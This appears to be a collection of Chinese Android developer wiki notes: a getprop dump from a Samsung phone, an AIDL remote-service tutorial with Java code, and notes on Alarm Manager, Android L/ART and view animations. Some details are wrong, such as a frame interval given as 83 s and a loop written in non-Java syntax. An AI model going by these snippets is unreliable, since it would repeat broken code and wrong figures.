[init.svc.DR-deamon]: [running]
[init.svc.TvoutService_C]: [running]
[init.svc.adbd]: [running]
[init.svc.dbus]: [running]
[init.svc.debuggerd]: [running]
[init.svc.dhcpcd_wlan0]: [running]
[init.svc.drm]: [running]
[init.svc.fRom]: [stopped]
[init.svc.flash_recovery]: [stopped]
[init.svc.immvibed]: [stopped]
[init.svc.installd]: [running]
[init.svc.keystore]: [running]
[init.svc.macloader]: [stopped]
[init.svc.media]: [running]
[init.svc.mobex-daemon]: [running]
[init.svc.netd]: [running]
[init.svc.playsound]: [stopped]
[init.svc.pvrsrvinit]: [stopped]
[init.svc.ril-daemon]: [running]
[init.svc.samsungani]: [stopped]
[init.svc.servicemanager]: [running]
[init.svc.smc_pa_wvdrm]: [stopped]
[init.svc.surfaceflinger]: [running]
[init.svc.tf_daemon]: [restarting]
[init.svc.vold]: [running]
[init.svc.wpa_supplicant]: [running]
[init.svc.zygote]: [running]
[keyguard.no_require_sim]: [true]
[net.bt.name]: [Android]
[net.change]: [net.dnschange]
[net.dns1]: [192.168.1.1]
[net.dnschange]: [1]
[net.hostname]: [android-96c305608e07ca3]
[net.qtaguid_enabled]: [1]
[net.rmnet0.dns1]: []
[net.rmnet0.dns2]: []
[net.rmnet0.gw]: []
[net.tcp.buffersize.default]: [4096,87380,110208,4096,16384,110208]
[net.tcp.buffersize.edge]: [4093,26280,35040,4096,16384,35040]
[net.tcp.buffersize.gprs]: [4092,8760,11680,4096,8760,11680]
[net.tcp.buffersize.umts]: [4094,87380,110208,4096,16384,110208]
[net.tcp.buffersize.wifi]: [4095,87380,110208,4096,16384,110208]
[net.wlan0.dns1]: [49.0.0.0]
[net.wlan0.dns2]: []
[persist.hwc.docking.enabled]: [0]
[persist.sys.camera.connect]: [0]
[persist.sys.camera.transform]: [0]
[persist.sys.country]: [CN]
[persist.sys.hdmi.on]: [0]
[persist.sys.language]: [zh]
[persist.sys.localevar]: []
[persist.sys.mirroring.transform]: [0]
[persist.sys.profiler_ms]: [0]
[persist.sys.storage_preload]: [2]
[persist.sys.strictmode.disable]: [true]
[persist.sys.strictmode.visual]: [false]
[persist.sys.timezone]: [Asia/Shanghai]
[persist.sys.usb.config]: [mtp,adb]
[ril.FS]: [false]
[ril.ICC_TYPE]: [0]
[ril.RildInit]: [1]
[ril.approved_codever]: [none]
[ril.approved_cscver]: [none]
[ril.approved_modemver]: [none]
[ril.barcode]: []
[ril.ecclist0]: [112,911,08,000,110,999,118,119]
[ril.encrypt_customer]: [4A81D3AA37FA5774F8A86626D2661B67]
[ril.hw_ver]: [MP 0.900]
[ril.model_id]: [I9100G]
[ril.official_cscver]: [I9100GOZHLPL]
[ril.prl_num]: [0]
[ril.product_code]: [GT-I9100LKGCHN]
[ril.rfcal_date]: [2012.11.1]
[ril.sales_code]: [CHN]
[ril.serialnumber]: [00000000000]
[ril.sw_ver]: [I9100GZCLPL]
[ril.tethering.usb.active]: [0]
[ril.timezoneID]: [Asia/Harbin]
[rild.libargs]: [-d /dev/ttyS0]
[rild.libpath]: [/system/lib/libsec-ril.so]
[ro.adb.qemud]: [1]
[ro.allow.mock.location]: [0]
[ro.baseband]: [unknown]
[ro.board.platform]: [omap4]
[ro.bootloader]: [unknown]
[ro.bootmode]: [power_key]
[ro.bt.bdaddr_path]: [/efs/bluetooth/bt_addr]
[ro.build.PDA]: [I9100GZCLPL]
[ro.build.changelist]: [1067026]
[ro.build.characteristics]: [phone]
[ro.build.date.utc]: [1349414895]
[ro.build.date]: [Fri Oct  5 14:28:15 KST 2012]
[ro.build.description]: [GT-I9100G-user 4.0.4 IMM76D ZCLPL release-keys]
[ro.build.display.id]: [IMM76D.ZCLPL]
[ro.build.fingerprint]: [samsung/GT-I9100G/GT-I9100G:4.0.4/IMM76D/ZCLPL:user/release-keys]
[ro.build.hidden_ver]: [I9100GZCLPL]
[ro.build.host]: [SEP-88]
[ro.build.id]: [IMM76D]
[ro.build.product]: [GT-I9100G]
[ro.build.tags]: [release-keys]
[ro.build.type]: [user]
[ro.build.user]: [se.infra]
[ro.build.version.codename]: [REL]
[ro.build.version.incremental]: [ZCLPL]
[ro.build.version.release]: [4.0.4]
[ro.build.version.sdk]: [15]
[ro.camera.sound.forced]: [1]
[ro.carrier]: [unknown]
[ro.com.android.dataroaming]: [false]
[ro.com.android.dateformat]: [MM-dd-yyyy]
[ro.com.google.clientidbase]: [android-samsung]
[ro.com.google.locationfeatures]: [1]
[ro.config.alarm_alert]: [Good_Morning.ogg]
[ro.config.media_sound]: [Media_preview_Touch_the_light.ogg]
[ro.config.notification_sound]: [S_Whistle.ogg]
[ro.config.ringtone]: [S_Over_the_horizon.ogg]
[ro.crypto.fs_flags]: [0x00000406]
[ro.crypto.fs_mnt_point]: [/data]
[ro.crypto.fs_options]: [noauto_da_alloc]
[ro.crypto.fs_real_blkdev]: [/dev/block/mmcblk0p10]
[ro.crypto.fs_type]: [ext4]
[ro.crypto.keyfile.userdata]: [/efs/metadata]
[ro.crypto.state]: [unencrypted]
[ro.csc.country_code]: [China]
[ro.csc.sales_code]: [CHN]
[ro.debuggable]: [0]
[ro.error.receiver.default]: [com.samsung.receiver.error]
[ro.factorytest]: [0]
[ro.hardware]: [t1]
[ro.kernel.qemu]: [0]
[ro.opengles.version]: [131072]
[ro.product.board]: [tuna]
[ro.product.brand]: [samsung]
[ro.product.cpu.abi2]: [armeabi]
[ro.product.cpu.abi]: [armeabi-v7a]
[ro.product.device]: [GT-I9100G]
[ro.product.locale.language]: [en]
[ro.product.locale.region]: [US]
[ro.product.manufacturer]: [samsung]
[ro.product.model]: [GT-I9100G]
[ro.product.name]: [GT-I9100G]
[ro.radio.noril]: [yes]
[ro.revision]: [0]
[ro.ril.gprsclass]: [10]
[ro.ril.hsxpa]: [1]
[ro.runtime.firstboot]: [947145472702]
[ro.secdirenc]: [true]
[ro.secfulldirenc]: [true]
[ro.secsddecryption]: [true]
[ro.secure]: [1]
[ro.serialno]: [c009013137aa5af]
[ro.setupwizard.mode]: [DISABLED]
[ro.sf.lcd_density]: [240]
[ro.tether.denied]: [false]
[ro.url.legal.android_privacy]: [http://www.google.com/intl/%s/mobile/android/basic/privacy.html]
[ro.url.legal]: [http://www.google.com/intl/%s/mobile/android/basic/phone-legal.html]
[ro.wifi.channels]: []
[sys.boot_completed]: [1]
[sys.ccr]: [false]
[sys.settings_system_version]: [3]
[sys.usb.config]: [mtp,adb]
[sys.usb.state]: [mtp,adb]
[system_init.startsurfaceflinger]: [0]
[vold.post_fs_data_done]: [1]
[wifi.interface]: [wlan0]
[wifi.supplicant_scan_interval]: [15]
[wlan.driver.status]: [ok]
```
# run-as <package>
切换shell为指定用户的身份
可以取得系统时间制：
```
#!java
ContentResolver cv = this.getContentResolver();
        String strTimeFormat = android.provider.Settings.System.getString(cv,
                                           android.provider.Settings.System.TIME_12_24);
       
        if(strTimeFormat.equals("24"))
       {
              Log.i("activity","24");
        }
```
[[TOC]]
# Android AIDL
每个Android应用都运行在独自的进程中， 如果你在自己应用的Service中实现了一些功能， 并且希望其他应用也能使用. 那就必需要用IPC方法来传递参数/计算结果等数据. AIDL正是Android平台提供的IPC服务。
AIDL是一种IDL语言，用来支持Android平台上进程间通讯。
AIDL IPC机制基于接口， 类似于COM和Corba, 但是更加轻量，从技术角度讲， 它使用了代理类承载进程间通讯的数据. 由于这种方法机械而有规律，所以我们可以通过AIDL语言进行更抽象的表达，再用编译器生成
可以工作的Java代码。
# 实现远程Service
# 1. 定义.aidl文件
ITimeService.aidl, 为了避免编译器生成的代码与本地既有代码冲突，我们可以加上前缀'I', 即为Interface之意思。
```
#!java
package com.pansi.msg.remote;
interface ITimeService {
    String getNow();
}
```
定义好接口后，你可以编译一下， 顺利的话，开发工具会帮你生成gen/com/pansi/msg/remote/ITimeService.java文件。 
# 2. 实现接口
接下来需要添上真正工作的代码了，你需要继承ITimeService.Stub类(介个都是上步由编译器生成的).
```
#!java
	class ITimeServiceStub extends ITimeService.Stub {
		@Override
		public String getNow() throws RemoteException {
			String timeFormat = PreferenceManager.getDefaultSharedPreferences(TimeService.this).getString(Keys.PKEY_TIME_FORMAT, "");
			return DateFormat.format(timeFormat, System.currentTimeMillis()).toString();
		}
	}
```
这里的Stub类，可以根据需要放在单独的文件中，或是作为Service的内部类(见本例).
# 3. 实现Service
Service需要根据Action的不同，在onBind方法中返回对应的Stub对象。
```
#!java
package com.pansi.msg.remote;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.RemoteException;
import android.preference.PreferenceManager;
import android.text.format.DateFormat;
public class TimeService extends Service {
	public static final String ACTION_GET_NOW = "com.pansi.msg.remote.ACTION_GET_NOW";
	
	class ITimeServiceStub extends ITimeService.Stub {
		@Override
		public String getNow() throws RemoteException {
			String timeFormat = PreferenceManager.getDefaultSharedPreferences(TimeService.this).getString(Keys.PKEY_TIME_FORMAT, "");
			return DateFormat.format(timeFormat, System.currentTimeMillis()).toString();
		}
	}
	@Override
	public IBinder onBind(Intent intent) {
		String action = intent.getAction();
		if(ACTION_GET_NOW.equals(action)) {
			return new ITimeServiceStub();
		}
		return null;
	}	
}
```
别忘记在AndroidManifest.xml中注册Service
```
#!xml
<?xml version="1.0" encoding="utf-8"?>
<manifest
    xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.pansi.msg.remote"
    android:versionCode="1"
    android:versionName="1.0">
  <application
      android:icon="@drawable/icon"
      android:label="@string/app_name">
      ...
    <service android:name="TimeService">
      <intent-filter>
        <action android:name="com.pansi.msg.remote.ACTION_GET_NOW" />
      </intent-filter>
    </service>
  </application>
</manifest>
```
至此， 远程Service部分的工作已经完成。 
# 在其他应用中使用服务
现在我们在另一个应用中使用这个Service. 我们这个应用的包名为`com.pansi.msg.client`
# 1. 将.aidl文件拷贝到源代码目录下
首先，如果想使用远程Service提供的服务，那就必需知道它提供哪些服务，AIDL基于接口，换言之必需知道有哪些可以使用的接口，这些接口当然得是实实在在的代码。
记得在远程Service那个应用中定义的.aidl文件么？将它拷贝到当前应用的工程下。然后编译生成相应的Java文件，
至此，不难看出， AIDL编译器根据我们对接口的描述，生成辅助IPC的代码，在提供服务端，使用服务端的代码，在客户端使用客户端的代码。
# 2. 实现android.content.ServiceConnection接口
客户端使用远程Service提供的服务需要使用如下方法:
```
#!java
boolean bindService(Intent service, ServiceConnection conn, int flags);
```
|| Intent service || 启动远程服务的Intent, 远程Service会根据这个Intent中的Action返回相应的Stub对象 ||
|| !ServiceConnection conn || 远程Service通过该接口返回远程对象 ||
|| int flags || BIND_AUTO_CREATE ||
远程Sevice根据action之不同，返回了一个IBinder(或Stub)对象实例， 它通过ServiceConnection的`onServiceConnected(ComponentName name, IBinder service)`接口，传递给客户端.
客户端需要将收到的IBinder对象实例转化为接口对象实例，本例中为`ITimeService`， 方法如下:
```
#!java
	@Override
	public void onServiceConnected(ComponentName name, IBinder service) {
		mService = ITimeService.Stub.asInterface(service);
	}
```
完整代码:
```
#!java
package com.pansi.msg.client;
import com.pansi.msg.remote.ITimeService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
public class TimeServiceConnection implements ServiceConnection {
	private ITimeService mService;
	private Context      mContext;
	
	public TimeServiceConnection(Context context) {
		mContext = context;
	}
	
	@Override
	public void onServiceConnected(ComponentName name, IBinder service) {
		mService = ITimeService.Stub.asInterface(service);
	}
	@Override
	public void onServiceDisconnected(ComponentName name) {
		mService = null;
	}
	
	
	public void safeConnectService() {
		if(mService ==  null) {
			Intent intent = new Intent("com.pansi.msg.remote.ACTION_GET_NOW");
			intent.setClassName("com.pansi.msg.remote", "com.pansi.msg.remote.TimeService");
			mContext.bindService(intent, this, Context.BIND_AUTO_CREATE);
		}
	}
	
	public void safeDisconnectTheService() {
		if(mService != null) {
			mContext.unbindService(this);
			mService = null;
		}
	}
	
	public String safeGetTime() {
		String now = "";
		if (mService == null) {
			safeConnectService();
		} else {
			try {
				now = mService.getNow();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		return now;
	}
}
```
# 3. 在Activity中调用服务
```
#!java
package com.pansi.msg.client;
import com.pansi.msg.client.R;
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
public class MainActivity extends Activity {
	
	Button mBtnGetCurrentTime = null;
	TextView mTvTime          = null;
	TimeServiceConnection mTimeServiceConnection = null;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        mBtnGetCurrentTime = (Button)findViewById(R.id.btn_1);
        mBtnGetCurrentTime.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				onGetCurrentTime();
			}
		});
        
        mTvTime = (TextView)findViewById(R.id.tv_1);
        mTimeServiceConnection = new TimeServiceConnection(this);
    }
	protected void onGetCurrentTime() {
		String time = mTimeServiceConnection.safeGetTime();
		mTvTime.setText(time);
	}
	
	@Override
	protected void onResume() {
		super.onResume();
		mTimeServiceConnection.safeConnectService();
	}
	
	@Override
	protected void onPause() {
		super.onPause();
		mTimeServiceConnection.safeDisconnectTheService();
	}
}
```
# 源码目录结构
||= com.pansi.msg.remote =||= com.pansi.msg.client =||
```td
```
com.pansi.msg.remote
|-- AndroidManifest.xml
|-- gen
|   `-- com
|       `-- pansi
|           `-- msg
|               `-- remote
|                   |-- ITimeService.java (AIDL编译器生成的用于IPC通讯的Java文件)
|                   `-- R.java
|-- res
|   |-- ...
`-- src
    `-- com
        `-- pansi
            `-- msg
                `-- remote
                    |-- ITimeService.aidl (接口描述文件)
                    |-- Keys.java
                    |-- MainActivity.java
                    `-- TimeService.java
```
```
```td
```
com.pansi.msg.client
|-- AndroidManifest.xml
|-- gen
|   `-- com
|       `-- pansi
|           `-- msg
|               |-- client
|               |   `-- R.java
|               `-- remote
|                   `-- ITimeService.java (AIDL编译器生成的用于IPC通讯的Java文件)
|-- res
|   |-- ...
`-- src
    `-- com
        `-- pansi
            `-- msg
                |-- client
                |   |-- MainActivity.java
                |   `-- TimeServiceConnection.java
                `-- remote
                    `-- ITimeService.aidl (接口描述文件，从服务提供方拷贝而来)
```
```
# 建立.aidl文件
 * 你可以使用的数据类型
  * JavaPrivitive类型(int, boolean ...), 不需要import即可在aidl文件中直接使用
  * String
  * List
  * Map
  * CharSequence
 * Other AIDL-generated interfaces, which are always passed by reference. An import statement is always needed for these.
 * Custom classes that implement the Parcelable protocol and are passed by value. An import statement is always needed for these.
# 使用对象
```
package com.android.email.provider;
parcelable EmailContent.HostAuth;
```
```
package com.android.im;
import com.android.im.IConnectionListener;
import com.android.im.IChatSessionManager;
import com.android.im.IContactListManager;
import com.android.im.IInvitationListener;
import com.android.im.engine.Presence;
interface IImConnection {
    void registerConnectionListener(IConnectionListener listener);
    void unregisterConnectionListener(IConnectionListener listener);
    void setInvitationListener(IInvitationListener listener);
    IContactListManager getContactListManager();
    IChatSessionManager getChatSessionManager();
    /**
     * Login the IM server.
     *
     * @param accountId the id of the account in content provider.
     * @param userName the useName.
     * @param password the password.
     * @param autoLoadContacts if true, contacts will be loaded from the server
     *          automatically after the user successfully login; otherwise, the
     *          client must load contacts manually.
     */
    void login(long accountId, String userName, String password, boolean autoLoadContacts);
    void logout();
    void cancelLogin();
    Presence getUserPresence();
    int updateUserPresence(in Presence newPresence);
    /**
     * Gets an array of presence status which are supported by the IM provider.
     */
    int[] getSupportedPresenceStatus();
    int getState();
    /**
     * Gets the count of active ChatSessions of this connection.
     */
    int getChatSessionCount();
    long getProviderId();
    long getAccountId();
    void acceptInvitation(long id);
    void rejectInvitation(long id);
}
```
```
#!java
package com.android.email.service;
import com.android.email.service.IEmailServiceCallback;
import android.os.Bundle;
interface IEmailService {
    int validate(in String protocol, in String host, in String userName, in String password,
        int port, boolean ssl, boolean trustCertificates) ;
    void startSync(long mailboxId);
    void stopSync(long mailboxId);
    void loadMore(long messageId);
    void loadAttachment(long attachmentId, String destinationFile, String contentUriString);
    void updateFolderList(long accountId);
    boolean createFolder(long accountId, String name);
    boolean deleteFolder(long accountId, String name);
    boolean renameFolder(long accountId, String oldName, String newName);
    void setCallback(IEmailServiceCallback cb);
    void setLogging(int on);
    void hostChanged(long accountId);
    Bundle autoDiscover(String userName, String password);
    void sendMeetingResponse(long messageId, int response);
}
```
```
#!java
package com.android.email.service;
oneway interface IEmailServiceCallback {
    /*
     * Ordinary results:
     *   statuscode = 1, progress = 0:      "starting"
     *   statuscode = 0, progress = n/a:    "finished"
     *
     * If there is an error, it must be reported as follows:
     *   statuscode = err, progress = n/a:  "stopping due to error"
     *
     * *Optionally* a callback can also include intermediate values from 1..99 e.g.
     *   statuscode = 1, progress = 0:      "starting"
     *   statuscode = 1, progress = 30:     "working"
     *   statuscode = 1, progress = 60:     "working"
     *   statuscode = 0, progress = n/a:    "finished"
     */
    /**
     * Callback to indicate that an account is being synced (updating folder list)
     * accountId = the account being synced
     * statusCode = 0 for OK, 1 for progress, other codes for error
     * progress = 0 for "start", 1..100 for optional progress reports
     */
    void syncMailboxListStatus(long accountId, int statusCode, int progress);
    /**
     * Callback to indicate that a mailbox is being synced
     * mailboxId = the mailbox being synced
     * statusCode = 0 for OK, 1 for progress, other codes for error
     * progress = 0 for "start", 1..100 for optional progress reports
     */
    void syncMailboxStatus(long mailboxId, int statusCode, int progress);
    /**
     * Callback to indicate that a particular attachment is being synced
     * messageId = the message that owns the attachment
     * attachmentId = the attachment being synced
     * statusCode = 0 for OK, 1 for progress, other codes for error
     * progress = 0 for "start", 1..100 for optional progress reports
     */
    void loadAttachmentStatus(long messageId, long attachmentId, int statusCode, int progress);
    /**
     * Callback to indicate that a particular message is being sent
     * messageId = the message being sent
     * statusCode = 0 for OK, 1 for progress, other codes for error
     * progress = 0 for "start", 1..100 for optional progress reports
     */
    void sendMessageStatus(long messageId, String subject, int statusCode, int progress);
}
```
# 参考
 * [http://d.hatena.ne.jp/sei10sa10/20110417/1303051553 使用AIDL实现远程Callback示例]
 
# Android Alarm Manager 
 * This class provides access to the system alarm services. 
 * These allow you to schedule your application to be run at some point in the future. 
 * When an alarm goes off, the Intent that had been registered for it is broadcast by the system, automatically starting the target application if it is not already running. 
 * Registered alarms are retained while the device is asleep (and can optionally wake the device up if they go off during that time), but will be cleared if it is turned off and rebooted.
 * The Alarm Manager holds a CPU wake lock as long as the alarm receiver's onReceive() method is executing. This guarantees that the phone will not sleep until you have finished handling the broadcast. 
 * Once onReceive() returns, the Alarm Manager releases this wake lock. This means that the phone will in some cases sleep as soon as your onReceive() method completes. If your alarm receiver called Context.startService(), it is possible that the phone will sleep before the requested service is launched. To prevent this, your BroadcastReceiver and Service will need to implement a separate wake lock policy to ensure that the phone continues running until the service becomes available.
Note: The Alarm Manager is intended for cases where you want to have your application code run at a specific time, even if your application is not currently running. For normal timing operations (ticks, timeouts, etc) it is easier and much more efficient to use Handler.
```
#!div class=note
''' 注意:'''
You do not instantiate this class directly; instead, retrieve it through Context.getSystemService(Context.ALARM_SERVICE).
```
[[TOC]]
# Android
# 64bit / ART
 * Android 4.4 之下ART为可选Runtime, 默认仍然为Delivik, AndroidL默认Runtime为ART
 * 支持ARM, x86 and MIPS processors
 * 兼容 64-bit CPU
 * x2 faster
 * 多数应用不需要更改就可以在ART上运行
 * ART最终会使用(目前不是) Compacting garbage collector, 对象会在GC后改变地址, 所以JNI代码可能会有兼容问题. (可以使用工具检查: http://android-developers.blogspot.hk/2011/07/debugging-android-jni-with-checkjni.html)
 * Delivik中Java的Stack和Native的Stack是分开的, ART则是共用的.
 * 有些程序可能依赖/system/framework, /data/dalvik-cache下的odex文件, 现在这些文件会变成ELF格式的, 所以最好不要干这种事情.
 * ART编译器可以十分可靠的处理标准JAVA字节码,但是不见得能很好的处理Delivik字节码,尤其是经过混淆/优化的字节码可能会遭遇ART编译失败.
 * System.gc() 不再很有效, 用多了反而会有害, 总之不能依靠这个, 可以通过判断当前的Runtime是不是ART来决定是否调用gc()
 * 部分JNI函数开始抛异常了(所谓的更加严格的JNI规范, 可以使用CheckJNI工具进行检查)
# 通知栏
  * UI风格发生变化
  * Head-off通知栏, 以悬浮窗的模式显示在屏幕顶部
  * 使用 Ringtone/ !MediaPlayer / Vibrator 发出声音的Notification应该把代码去掉, 或者使用 Notification.Builder来设置声音和震动.
# ActivityManager.getRecentTasks()
 * 出于隐私问题, 这个API已经标记为失效, 出于兼容性考虑, 仍然会返回部分数据.
 * 应用可以通过android.app.ActivityManager.getAppTasks() 检索自己的Task
# UI
  * View shadows (原来只是支持x/y方向的shadow, 现在支持z方向, 很多情况下阴影不需要做到切图里了)
  * !RecyclerView (一个更高级的ListView, 在性能/内存使用上有优化)
  * !CardView 
# Lockscreen Notifications
所屏时显示通知.
[[Image(http://icdn2.digitaltrends.com/image/screen-shot-2014-06-25-at-2-36-00-pm-625x625.png)]]
 * VISIBILITY_PRIVATE: 显示通知的基本信息, 比如图标,内容不展示
 * VISIBILITY_PUBLIC: 所有通知内容都显示
 * VISIBILITY_SECRET: 啥都不显示
# New Recent App View 
# Improved Graphics
 * 支持OpenGL ES 3.1
 * Android Extension Pack
# Notification:
[[Image(http://developer.android.com/preview/images/hun-example.png)]]
 
# Concurrent documents and activities in the Recents screen
统一个应用可以有多个任务并存, 可以相互切换.
# 存储
 * !DocumentsProvider : 允许用户选中目录, 对整个目录以及子目录设置读写权限(不需要用户逐一确认)
 * android.content.Context.getExternalMediaDirs() 提供了一个新的存储APP相关的媒体文件的机制, 可以帮助MediaStore更快的索引媒体文件. `(重要)`
# 无线网络
 * 多个网络连接并存 (`重要`)
# Bluetooth 4.1
 * 蓝牙4.3 / Bluetooth Low Energy
# Volta / Battery Histrian
 * JobScheduler
# Sec. & Privacy
# !WebView 
新增支持 :
 * !WebAudio
 * WebGL
 * WebRTC
# Google play service , system update
可以通过Google play下载漏洞补丁
# NFC
 * Android Beam加入到分享菜单中
# API示例
# 参考
 * http://developer.android.com/preview/api-overview.html
 * http://developer.android.com/preview/reference.html
 * http://developer.android.com/preview/material/index.html
# Android Animation
动画类型:
 * FrameAnimation : 由多个帧组成,每次按照定义好的模式播放
 * SurfaceBasedAnimation :  动态的反应一些数据的变化,游戏即属于此类
 * Tweens & Animatiors : 多应用于WidgetBasedApplication
# Frame Animation
The first sort of animation we'll look at is the animation that we used to make the splash screen. It's called a frame animation. Using this technique, you make an animation by creating several images and displaying them one after the other, like a strip of cinema film.
对应的对象为AnimationDrawable.
```
<?xml version="1.0" encoding="utf-8"?>
<animation-list xmlns:android="http://schemas.android.com/apk/res/android"
    android:oneshot=["true" | "false"] >
    <item
        android:drawable="@[package:]drawable/drawable_resource_name"
        android:duration="integer" />
</animation-list>
```
 * animation-list
  * oneshot
 * item
  * drawable
  * duration
# 播放
```java
ImageView rocketImage = (ImageView) findViewById(R.id.rocket_image);
rocketImage.setBackgroundResource(R.drawable.rocket_thrust);
rocketAnimation = (AnimationDrawable) rocketImage.getBackground();
rocketAnimation.start()
```
你也可以使用: AnimationDrawable.setVisible(ture, true)
 * 第一个参数: 是否显示
 * 第二个参数: 是否重置为第一帧
```div class=note
电影每秒种播放24帧, 手机设备上12帧/秒的效果也很不错.  所以由12帧组成的动画, 播放间隔大约为 1000/12 = 83s.
```
你可以使用Java代替上述的XML, 大概:
```java
		AnimationDrawable am = new AnimationDrawable();
		am.setOneShot(true);
		
        // 添加帧
		for(Drawable x in xs) {
			am.addFrame(x, 80);
		}
```
```
# 回放控制
 * 停止
 * 加速播放
 * 减速播放
 * 暂停
 * 加帧/减帧
# Transition Animations: 切换动画
当你想在两副视图之间切换的时候,需要辅助一些动画效果进行平滑的切换, 此时你需要一系列的帧, 比如透明度按照某种方式递减, 等等. 本质和FrameAnimation是一回事, 但是你不必手动生成这些帧.
和Transition有关的方法:
```java
#Activity:
overridePendingTransition(R.anim.zoom_enter, R.anim.zoom_exit);
```
```
package org.whitetree.labs;
import android.app.Activity;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.TransitionDrawable;
import android.os.Bundle;
import android.view.View;
import android.widget.ImageView;
public class MainActivity extends Activity {
	ImageView iv = null;
	TransitionDrawable td = null;
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		iv = (ImageView) findViewById(R.id.iv);
		td = new TransitionDrawable(new Drawable[] {
				getResources().getDrawable(R.drawable.a),
				getResources().getDrawable(R.drawable.b)});
		iv.setImageDrawable(td);
	}
	public void onClickGo(View button) {
		td.startTransition(3000);
	}
	public void onClickBack(View button) {
		td.reverseTransition(3000);
	}
}
```
# Tweening
in-betweening的意思，它负责两个KeyFrame之间的承前启后。
由于我们可以控制View本身,修改一些参数，使得View支持一些动画效果， Tweens大概就是这个意思。
```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="http://schemas.android.com/apk/res/android"
    android:interpolator="@android:anim/linear_interpolator" >
    <translate
        android:duration="3000"
        android:fromYDelta="-100%p"
        android:toYDelta="0" />
</set>
```
```java
package org.whitetree.labs;
import android.app.Activity;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.TransitionDrawable;
import android.os.Bundle;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.ImageView;
public class MainActivity extends Activity {
	ImageView iv = null;
	TransitionDrawable td = null;
	Animation anim = null;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		iv = (ImageView) findViewById(R.id.iv);
		td = new TransitionDrawable(new Drawable[] {
				getResources().getDrawable(R.drawable.a),
				getResources().getDrawable(R.drawable.b)});
		iv.setImageDrawable(td);
		anim = AnimationUtils.loadAnimation(this, R.anim.fail_down);
	}
	public void onClickGo(View button) {
		iv.startAnimation(anim);
		td.startTransition(3000);
	}
	
	public void onClickBack(View button) {
		td.reverseTransition(3000);
	}
}
```
# Alpha Animation
可以控制透明度的变化
```xml
    <alpha
        android:duration="1000"
        android:fromAlpha="0"
        android:toAlpha="1" />
```
 * 1.0 : 不透明
||= android:fromAlpha =||
||= android:toAlpha   =||
# Rotate Animation
以自身为圆心旋转360.
```xml
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="http://schemas.android.com/apk/res/android"
    android:interpolator="@android:anim/accelerate_interpolator" >
    <rotate
        android:duration="3000"
        android:fromDegrees="0"
        android:pivotX="50%"
        android:pivotY="50%"
        android:toDegrees="360" />
</set>
```
||= android:fromDegrees =||
||= android:toDegrees =||
||= android:pivotX =||
||= android:pivotY =|| 
 
 * number%
 * number%p
 * number
以自身左上角坐标为原点旋转360
```xml
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="http://schemas.android.com/apk/res/android"
    android:interpolator="@android:anim/accelerate_interpolator" >
    <rotate
        android:duration="3000"
        android:fromDegrees="0"
        android:toDegrees="360" />
</set>
```
# Scale Animation
||= android:fromXScale =||
||= android:fromYScale =||
||= android:toXScale   =||
||= android:toYScale   =||
||= android:pivotX     =||
||= android:pivotY     =||
# 公用属性
||= 属性名 =||
||= android:interpolator =|| 加速器  ||
||= android:duration     =|| ||msec
||= android:startOffset  =|| ||msec
||= android:repeatCount  =|| 动画播放次数 ||N / infinite
||= android:repeatMode   =|| 重播模式     ||restart / reverse
# Translate Animation
|| android:fromYDelta || -100%p || 从p的Top开始动画, p指的是parent, 即父View ||
|| android:toYDelta || 0 || 结束位置 ||
|| android:fromXDelta || - ||
|| android:toXDelta || - ||
# Interpolations
每个动画都需要一个 Interpolator, 它用来控制时间。 多快去做一件事情。
你可以把他想象为节奏。
 
 * accelerate: 加速度
 * deaccelerate: 减速度
 * bounce
Sharing interpolators
An AnimationSet can cause all of its children to use the same interpolator, or it can allow them to define their own instances of interpolators.
This is specialed in the `android:sharedInterpolator` XML attribute, as you will now see.
# Animating Layouts
```xml
<?xml version="1.0" encoding="utf-8"?>
<layoutAnimation
  xmlns:android="http://schemas.android.com/apk/res/android"
    android:animation="@anim/block_drop"
    android:delay="20%"
    android:animationOrder="reverse" />
```
# Animators - new in anroid 3.0
As you are no doubt aware that views in Android GUIs have many accessors defning their
position, their color, and so on, wouldn't it just be simpler to animate a view by changing
those parameters a little bit each frame? This feature has been introduced in Honeycomb;
it's called an Animator.
At its most basic level, animators are little daemon threads that wake up, change a view a
bit, and go back to sleep till the next frame. They are a lot like the old Animation classes for
tweening, but they are more generalized.
For instance, an Animator would allow you to modify the background color of a view,
something that no tween could do. And if you have implemented your own views with
special properes, they will work for those too.
unlike a tween, they are not designed to go between two states. If you want that
sort of functionality, you will have to program it yourself. They are also less descriptive to use
in your code—a tween allows you to say translate this object 200 pixels on the X-axis, but
an Animator says increment the X parameter by 200 pixels.
# Animation Sets
如果把多种动画组合在一起，会产生更多的奇妙效果。
# Frame Scheduling
通常我们保持固定的刷新率，为了节省资源，尽量在不需要重绘的情况下让GameLoop进入睡眠.
# Surface
重绘screen太耗电， 用surface更划算。
Surfaces are raw areas of screen that you can draw whatever you like into. You can refresh them when you want, handle user touches however you like, and you even get a handy toolkit of common vector and bitmap drawing operations to make use of.
何时应当使用surface:
 * When you want to compute the appearance of your animation, rather than follow a predefined pattern
 * When you are making something that doesn't follow the widget-based interaction model
 * When you are making something that needs to run fast
 * Games
 * Live wallpapers
 * DSP and music visualizations (maybe that's just me)
# APK Expansion Files
```div class=note
 * 每个app安装包最大为50M
 * 你可以为每个app最多提供4GB的扩展数据，这些数据文件可以由GooglePlay免费托管
 * 这些文件可以是任何类型
```
你在GooglePlayConsole提交应用的同时，可以上传两个数据文件，每个最大为2GB, 其中:
 * 主扩展文件(MainExpansionFile): 为应用提供扩展数据文件
